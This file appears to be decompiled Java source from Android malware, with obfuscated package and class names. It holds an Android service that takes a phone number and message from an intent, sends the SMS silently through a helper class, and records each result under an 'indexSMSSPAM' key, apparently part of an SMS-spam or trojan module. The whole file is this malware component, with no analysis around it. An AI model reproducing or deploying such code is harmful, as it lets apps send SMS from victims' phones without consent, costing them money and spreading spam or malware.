package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import wocwvy.czyxoxmbauu.slsa.C0034b;

public class dshd extends Service {

    /* renamed from: a */
    Context f515a;

    /* renamed from: b */
    C0034b f516b = new C0034b();

    /* renamed from: c */
    BroadcastReceiver f517c = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            C0034b bVar;
            String str;
            String str2;
            if (getResultCode() != -1) {
                dshd.this.f516b.mo213a("S", "Error SMS SENT");
                bVar = dshd.this.f516b;
                str = "indexSMSSPAM";
                StringBuilder sb = new StringBuilder();
                sb.append(dshd.this.f516b.mo234e(context, "indexSMSSPAM"));
                sb.append("|");
                str2 = sb.toString();
            } else {
                dshd.this.f516b.mo213a("S", "SMS SENT");
                bVar = dshd.this.f516b;
                str = "indexSMSSPAM";
                str2 = "";
            }
            bVar.mo233d(context, str, str2);
            dshd.this.unregisterReceiver(dshd.this.f517c);
            dshd.this.stopSelf();
        }
    };

    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void onCreate() {
        super.onCreate();
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        this.f515a = this;
        this.f516b.mo228c(this, intent.getStringExtra("number"), intent.getStringExtra("msg"));
        registerReceiver(this.f517c, new IntentFilter("SMS_SENT"));
        return 2;
    }
}
